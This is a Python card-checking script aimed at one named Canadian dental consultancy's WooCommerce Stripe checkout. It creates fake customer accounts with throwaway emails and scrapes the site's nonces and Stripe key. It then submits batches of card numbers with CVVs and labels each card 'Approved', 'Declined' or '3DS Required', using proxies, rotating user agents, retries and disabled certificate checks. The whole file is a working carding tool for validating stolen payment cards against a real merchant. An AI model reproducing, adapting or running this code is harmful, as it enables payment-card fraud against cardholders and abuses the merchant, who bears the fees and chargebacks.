# ============================================================
#  SA2 — Stripe Auth CVV (nbconsultantedentaire.ca WC Stripe)
#  1:1 port from meduza_patched flow2
# ============================================================

import requests
import random
import string
import secrets
import uuid
import time
from datetime import datetime
from typing import Optional
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from faker import Faker
except ImportError:
    Faker = None

try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None


def gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ""


_EMAILS = [
    'gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com',
    'proton.me','protonmail.com','live.com','msn.com','yahoo.co.id',
    'yahoo.co.uk','yahoo.co.jp','ymail.com','rocketmail.com','live.uk',
    'live.co.uk','live.ca','outlook.co.uk','outlook.jp','tutanota.com',
    'tutanota.de','mailbox.org','zoho.com','zohomail.com','fastmail.com',
    'pm.me','yandex.com','yandex.ru','mail.ru','gmx.com','gmx.de',
    'web.de','seznam.cz','laposte.net','orange.fr','byom.de','byom.my.id',
    'edumail.vn','student.mail','alumni.email','icousd.com','ymail.cc',
    'momoi.re','mailgun.co','inboxkitten.com','maildrop.cc',
]


def _flow2(card, proxy_dict=None):
    ses = requests.Session()
    if proxy_dict:
        ses.proxies.update(proxy_dict)
    ses.verify = False

    fake = Faker("en_UK") if Faker else None
    chars = string.ascii_letters + string.digits + string.punctuation
    password = "".join(secrets.choice(chars) for _ in range(12))
    if UserAgent:
        ua = UserAgent(platforms='mobile')
        useragents = ua.random
    else:
        useragents = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36'

    email = f"{fake.user_name().lower() if fake else ''.join(random.choices(string.ascii_lowercase, k=8))}_{secrets.token_hex(4)}@{random.choice(_EMAILS)}"
    guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))
    today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    cc, mm, yy, cvv = card.split("|")
    mm = mm.zfill(2)
    yy = yy[-2:].zfill(2)
    cvv = cvv[:4]

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.nbconsultantedentaire.ca/en/my-account/',
        'user-agent': useragents,
    }

    r = ses.get('https://www.nbconsultantedentaire.ca/en/my-account/', headers=headers, timeout=35)
    txt = r.text.strip()
    regN = gstr(txt, 'hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '"')
    if not regN:
        regN = gstr(txt, 'name="woocommerce-register-nonce" value="', '"')
    if not regN:
        return None

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.nbconsultantedentaire.ca',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.nbconsultantedentaire.ca/en/my-account/',
        'user-agent': useragents,
    }

    data = {
        'email': email,
        'password': password,
        'wc_order_attribution_source_type': 'organic',
        'wc_order_attribution_referrer': 'https://www.google.com/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': 'google',
        'wc_order_attribution_utm_medium': 'organic',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.nbconsultantedentaire.ca/en/my-account/',
        'wc_order_attribution_session_start_time': today1,
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': useragents,
        'woocommerce-register-nonce': regN,
        '_wp_http_referer': '/en/my-account/',
        'register': 'Register',
    }

    ses.post('https://www.nbconsultantedentaire.ca/en/my-account/', headers=headers, data=data, timeout=35)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.nbconsultantedentaire.ca/en/my-account/',
        'user-agent': useragents,
    }

    ses.get('https://www.nbconsultantedentaire.ca/en/mon-compte-2/payment-methods/', headers=headers, timeout=35)

    headers['referer'] = 'https://www.nbconsultantedentaire.ca/en/my-account/'
    ses.get('https://www.nbconsultantedentaire.ca/mon-compte-2/', headers=headers, timeout=35)

    headers['referer'] = 'https://www.nbconsultantedentaire.ca/mon-compte-2/'
    ses.get('https://www.nbconsultantedentaire.ca/mon-compte-2/moyens-de-paiement/', headers=headers, timeout=35)

    headers['referer'] = 'https://www.nbconsultantedentaire.ca/mon-compte-2/moyens-de-paiement/'
    r = ses.get('https://www.nbconsultantedentaire.ca/mon-compte-2/ajouter-mode-paiement/', headers=headers, timeout=35)
    txt = r.text
    setupnonce = gstr(txt, 'createAndConfirmSetupIntentNonce":"', '"')
    pklive = gstr(txt, '"key":"', '"')

    if not setupnonce or not pklive:
        return None

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'user-agent': useragents,
    }

    ses.get(
        f'https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=setup&deferred_intent[currency]=cad&deferred_intent[payment_method_types][0]=card&deferred_intent[payment_method_types][1]=link&deferred_intent[setup_future_usage]=off_session&currency=cad&key={pklive}&_stripe_version=2024-06-20&elements_init_source=stripe.elements&referrer_host=www.nbconsultantedentaire.ca&stripe_js_id={sessionuid}&locale=fr-CA&type=deferred_intent',
        headers=headers, timeout=35,
    )

    headers = {
        'accept': 'application/json',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': useragents,
    }

    pm_data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "billing_details[address][country]": "ID",
        "pasted_fields": "number,cvc",
        "payment_user_agent": "stripe.js/5e3ab853dc; stripe-js-v3/5e3ab853dc; payment-element; deferred-intent",
        "referrer": "https://www.nbconsultantedentaire.ca",
        "time_on_page": "31221",
        "client_attribution_metadata[client_session_id]": "7071bdda-25bf-44e2-b3f9-24a6d871f023",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[elements_session_config_id]": "b290e603-1607-48c0-bca8-e701f839f27a",
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "_stripe_version": "2024-06-20",
        "key": pklive,
    }

    xr = ses.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=pm_data, timeout=35)
    txt = xr.text.strip()
    idpm = gstr(txt, 'id": "', '"')
    if not idpm:
        messga = gstr(txt, 'message": "', '"')
        return False, messga or "Payment method failed"

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.nbconsultantedentaire.ca',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.nbconsultantedentaire.ca/mon-compte-2/ajouter-mode-paiement/',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    ajax_data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': idpm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': setupnonce,
    }

    r3 = ses.post('https://www.nbconsultantedentaire.ca/wp-admin/admin-ajax.php',
                  headers=headers, data=ajax_data, timeout=35)
    res = r3.json()
    reszx = r3.text.strip()

    data_r = res.get("data") or {}
    status = data_r.get("status")
    error_msg = (data_r.get("error") or {}).get("message") or gstr(reszx, 'message":"', '"')

    if status == "succeeded":
        return True, "Card Approved"
    elif status == "requires_action":
        return False, "3DS Required"
    elif error_msg:
        return False, error_msg

    return None


def check_card(cc_line, proxy_dict=None):
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"

        card = cc_line.strip()

        for attempt in range(5):
            try:
                result = _flow2(card, proxy_dict)
                elapsed = f"{time.time() - start:.1f}s"

                if result is None:
                    if attempt < 4:
                        time.sleep(random.uniform(2, 5))
                        continue
                    return f"Error | Max retries | {elapsed}"

                if isinstance(result, tuple):
                    success, detail = result
                    if success is True:
                        return f"Approved | {detail} | {elapsed}"
                    elif success is False:
                        return f"Declined | {detail} | {elapsed}"

                return f"Error | Unknown | {elapsed}"

            except (requests.exceptions.ProxyError, requests.exceptions.SSLError,
                    requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                    ConnectionError, OSError):
                if attempt < 4:
                    time.sleep(random.uniform(0.3, 1.0))
                    continue
                return f"Declined | Gateway Timeout | {time.time() - start:.1f}s"
            except Exception as e:
                return f"Error | {str(e)[:60]} | {time.time() - start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    try:
        r = requests.get('https://www.nbconsultantedentaire.ca/en/my-account/', timeout=15, verify=False)
        if 'woocommerce-register-nonce' in r.text:
            return True, "WC Stripe registration active"
        return False, "Registration form not found"
    except Exception as e:
        return False, str(e)[:60]
